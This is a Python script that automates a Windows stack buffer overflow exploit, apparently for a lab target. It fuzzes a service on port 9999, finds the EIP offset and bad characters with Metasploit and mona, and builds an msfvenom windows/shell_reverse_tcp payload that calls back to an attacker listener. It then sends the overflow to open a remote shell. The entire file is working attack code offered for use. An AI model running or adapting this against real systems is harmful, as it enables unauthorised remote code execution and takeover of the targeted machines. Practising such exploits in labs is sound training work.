#!/usr/bin/env python3

import sys
import socket
import subprocess
from time import sleep

rhost = '10.10.146.251'
rport = 9999
lhost = '10.8.14.227'
lport = 9001

prefix = ''
offset = 0
timeout = 5
padding = '\x90' * 16
buffer = 'A' * 100
jumpaddr = 'BBBB'


def CreateBadCharPayload(baddies=[]):
	payload_string = ''
	for char in range(1, 256):
		tempbyte = '{:02x}'.format(char)
		if tempbyte in baddies: continue
		payload_string += '\\x' + tempbyte

	print('New badchar payload created!')
	return payload_string.encode().decode('unicode_escape')


def FindBadChars():
	filechars_list = CreateFileCharList() 
	badchars_list = CreateBadCharList(badchars)
	anyBaddies = False
	recentBad = True
	for bchar, fchar in zip(badchars_list, filechars_list):
		if fchar.lower() != bchar and recentBad:
			badchars.append(bchar)
			anyBaddies = True # used for check if no more bad chars remain
			recentBad = False # for the let consecutive bad chars to next round
			break # Uncomment this if there is too many bad chars
		else:
			recentBad = True
	print('Bad characters: ' + ','.join(badchars))
	return anyBaddies


def CreateFileCharList(): # Create char list from file
    with open('badfile.txt', 'r') as f:
        temp_badlist = [char for line in f.readlines() for char in line[8:].strip()[:23].split(' ')]
    return temp_badlist


def CreateBadCharList(baddies=[]):
	temp_badlist = []
	for char in range(1, 256):
		tempbyte = '{:02x}'.format(char)
		if tempbyte in baddies: continue
		temp_badlist.append(tempbyte)
	return temp_badlist


try:
    with open('config.txt', 'r') as f:
        step = f.read().split('\n')[0].split('=')[1]
except:
    with open('config.txt', 'w') as f:
        f.write('step=0')
        step = '0'


# Step 0 - Find  approximate value of offset
if step == '0':
    print('Step 1: Fuzzing')
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((rhost, rport))
                print('Buffer size:', len(buffer))
                s.send(bytes(prefix + buffer, 'latin-1'))
                s.recv(1024)
                buffer += 'A' * 100
                sleep(1)
        except:
            with open('config.txt', 'w') as f:
                f.write('step=1\noffset=' + str(len(buffer)))
            print('Crashed at:', len(buffer))
            step = '1'
            break

    input('\nRestart Immunity Debugger -> Enter \n')
    

# Step 1 - Find offset value of EIP
if step == '1':
    print('Step 2: Find EIP Offset')
    with open('config.txt', 'r') as f:
        offset = f.read().split('\n')[1].split('=')[1]
        offset = str(int(offset) + 100)

    command = '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ' + offset
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    pattern, error = process.communicate()
    pattern = pattern.decode()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((rhost, rport))
            s.send(bytes(prefix + pattern, 'latin-1'))
    except Exception as e:
        print('Connection error:', e)
        sys.exit(0)
        

    eip = input('Type EIP adress: ')

    command = '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q ' + eip
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    offset, error = process.communicate()
    offset = int(offset.decode().split(' ')[-1].strip())

    print('Offset:', offset)

    with open('config.txt', 'w') as f:
        f.write('step=2\noffset=' + str(offset))

    step = '2'
    input('\nRestart Immunity Debugger -> Enter \n')


badchars = []
# Step 2 - Find bad characters
if step == '2':
    print('Step 2: Finding Bad Chars')
    with open('config.txt', 'r') as f:
        offset = int(f.read().split('\n')[1].split('=')[1])
    
    while True:
        try:
            badchar_payload = CreateBadCharPayload(badchars)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((rhost, rport)) 
                s.send(bytes(prefix + 'A' * offset + 'BBBB' + badchar_payload + '\r\n', 'latin-1'))
            input('ESP -> Follow in Dump -> Copy till FF -> Paste into badfile.txt -> Press Enter')
            if FindBadChars():
                rec = input('There may still be bad characters. If you keep continue restart Immunity Debugger and press enter. Or type 0 to skip: ')
                if rec == '0': break
            else: # all the bad chars cleared
                print('All the bad characters cleared')
                break
        except Exception as e:
            print(e)
            break

    step = '3'
    with open('config.txt', 'w') as f:
        f.write('step=3\noffset={0}\nbadchars={1}'.format(offset, ','.join(badchars)))

    input('\nRestart Immunity Debugger -> Enter \n')


# Step 3 - Find jump point
if step == '3':
    print('Step 3: Finding Jmp Point')

    with open('config.txt', 'r') as f:
        file_string = f.read()

    offset = int(file_string.split('\n')[1].split('=')[1])
    badchars = file_string.split('\n')[2].split('=')[1].split(',')

    print('Step 3: Finding Jump Point')
    print('Paste this command to Immunity debugger -> Switch to Log data window -> Copy an address')

    if badchars[0] == '':
        print('!mona jmp -r esp -cpb "\\x00"')
    else:
        print('!mona jmp -r esp -cpb "\\x00\\x' + '\\x'.join(badchars) + '"')

    jmp_address = input('Adress: ').lower()
    arr = [jmp_address[6:8], jmp_address[4:6], jmp_address[2:4], jmp_address[0:2]]

    jmp_address = '\\x' + '\\x'. join(arr)
    with open('config.txt', 'w') as f:
        f.write('step=4\noffset={0}\nbadchars={1}\njmp={2}'.format(offset, ','.join(badchars), jmp_address))
    step = '4'


# Step 4 - Generate payload
if step == '4':
    print('Step 4: Generating Payload...')

    with open('config.txt', 'r') as f:
        file_string = f.read()

    offset = int(file_string.split('\n')[1].split('=')[1])
    badchars = file_string.split('\n')[2].split('=')[1].split(',')
    jumpaddr = file_string.split('\n')[3].split('=')[1]

    if badchars[0] == '':
        command = 'msfvenom -p windows/shell_reverse_tcp LHOST=' + lhost + ' LPORT=' + str(lport) + ' EXITFUNC=thread -b "\\x00" -f c'
    else:
        command = 'msfvenom -p windows/shell_reverse_tcp LHOST=' + lhost + ' LPORT=' + str(lport) + ' EXITFUNC=thread -b "\\x00\\x' + '\\x'.join(badchars) + '"' + ' -f c'

    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    output = output.decode()

    payload = ''
    for i in range(len(output)-4):
        if output[i:i+2] == '\\x':
            payload += output[i:i+4]
            i += 4
    
    with open('config.txt', 'w') as f:
        f.write('step=5\noffset={0}\nbadchars={1}\njmp={2}\npayload={3}'.format(offset, ','.join(badchars), jumpaddr, payload))
    step = '5'

    input('Ready your listener and make sure Immunity debugger is running!')


# Step 5 - Sending payload
if step == '5':
    print('Step 5: Sending Payload...')

    with open('config.txt', 'r') as f:
        file_string = f.read()

    offset = int(file_string.split('\n')[1].split('=')[1])
    jumpaddr = file_string.split('\n')[3].split('=')[1].encode().decode('unicode_escape')
    payload = file_string.split('\n')[4].split('=')[1].encode().decode('unicode_escape')

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((rhost, rport))
            s.send(bytes(prefix + 'A' * offset + jumpaddr + padding + payload + '\r\n', 'latin-1'))
            print('Done!!!')
    except Exception as e: 
        print(e)